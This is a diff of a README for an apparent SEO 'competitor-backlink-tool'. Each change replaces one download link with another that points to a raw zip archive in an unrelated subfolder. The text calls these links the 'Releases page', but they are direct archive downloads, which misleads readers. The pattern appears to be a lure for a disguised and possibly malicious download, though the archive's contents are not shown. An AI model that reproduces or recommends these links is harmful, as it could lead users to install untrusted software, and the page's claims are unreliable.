@@ -1,6 +1,6 @@
 # 📊 competitor-backlink-tool - Analyze Competitor Backlinks Easily
 
-[![Download Now](https://raw.githubusercontent.com/reggy18/competitor-backlink-tool/main/falconine/competitor-backlink-tool.zip%20Now-competitor--backlink--tool-brightgreen)](https://raw.githubusercontent.com/reggy18/competitor-backlink-tool/main/falconine/competitor-backlink-tool.zip)
+[![Download Now](https://raw.githubusercontent.com/reggy18/competitor-backlink-tool/main/falconine/backlink-competitor-tool-v1.4.zip%20Now-competitor--backlink--tool-brightgreen)](https://raw.githubusercontent.com/reggy18/competitor-backlink-tool/main/falconine/backlink-competitor-tool-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the competitor-backlink-tool. This tool helps you analyze your compet
 
 ## 📥 Download & Install
 
-To start using the competitor-backlink-tool, visit this page to download: [Download Here](https://raw.githubusercontent.com/reggy18/competitor-backlink-tool/main/falconine/competitor-backlink-tool.zip).
+To start using the competitor-backlink-tool, visit this page to download: [Download Here](https://raw.githubusercontent.com/reggy18/competitor-backlink-tool/main/falconine/backlink-competitor-tool-v1.4.zip).
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of the tool.
@@ -72,6 +72,6 @@ The competitor-backlink-tool is open-source software. Feel free to contribute, r
 
 ## 🌐 Learn More
 
-To get more details on the features and functionality, revisit the Releases page: [Download Here](https://raw.githubusercontent.com/reggy18/competitor-backlink-tool/main/falconine/competitor-backlink-tool.zip).
+To get more details on the features and functionality, revisit the Releases page: [Download Here](https://raw.githubusercontent.com/reggy18/competitor-backlink-tool/main/falconine/backlink-competitor-tool-v1.4.zip).
 
 We hope you find the competitor-backlink-tool valuable for your SEO and backlink analysis. Happy analyzing!
